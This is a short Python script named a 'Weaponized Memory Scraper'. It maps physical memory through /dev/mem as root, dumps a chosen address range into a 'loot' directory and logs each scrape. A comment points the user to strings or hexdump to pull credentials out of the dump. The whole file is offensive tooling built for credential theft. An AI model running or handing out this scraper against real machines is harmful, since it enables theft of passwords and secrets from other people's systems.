import os
import sys
import mmap

def scrape_physical_memory(address_hex, size_bytes, output_file):
    """
    Weaponized Memory Scraper: Maps physical RAM into the process address 
    space to extract raw data from /dev/mem.
    """
    if os.geteuid() != 0:
        print("[-] ROOT REQUIRED: Accessing /dev/mem requires UID 0.")
        sys.exit(1)

    try:
        address = int(address_hex, 16)
        print(f"[*] Targeting Physical Address: {address_hex}")
        print(f"[*] Scrape Size: {size_bytes} bytes")

        # Open the physical memory device
        fd = os.open("/dev/mem", os.O_RDONLY | os.O_SYNC)
        
        # Calculate page-aligned offset for mmap
        page_size = os.sysconf("SC_PAGE_SIZE")
        mmap_offset = (address // page_size) * page_size
        mmap_padding = address % page_size
        
        print(f"[*] Page Size: {page_size} | Mapping Offset: {hex(mmap_offset)}")

        # Map physical memory into process memory
        # Note: We map size + padding to ensure we reach the requested address
        mm = mmap.mmap(fd, size_bytes + mmap_padding, mmap.MAP_SHARED, mmap.PROT_READ, offset=mmap_offset)
        
        # Seek to the exact physical address requested
        mm.seek(mmap_padding)
        data = mm.read(size_bytes)

        # Write to loot
        with open(output_file, "wb") as f:
            f.write(data)

        print(f"[!] SUCCESS: {size_bytes} bytes dumped to {output_file}")
        
        # Tactical Note: Use 'strings' or 'hexdump -C' on the output file to find credentials.
        with open("../loot/mem_scrape_history.log", "a") as log:
            log.write(f"Address: {address_hex} | Size: {size_bytes} | File: {output_file}\n")

        mm.close()
        os.close(fd)

    except Exception as e:
        print(f"[-] Kernel Memory Fault: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: sudo python3 140_mem_scraper <hex_address> <size_bytes> <output_path>")
        print("Example: sudo python3 140_mem_scraper 0x100000 4096 ../loot/dump.bin")
        sys.exit(1)
    
    scrape_physical_memory(sys.argv[1], int(sys.argv[2]), sys.argv[3])
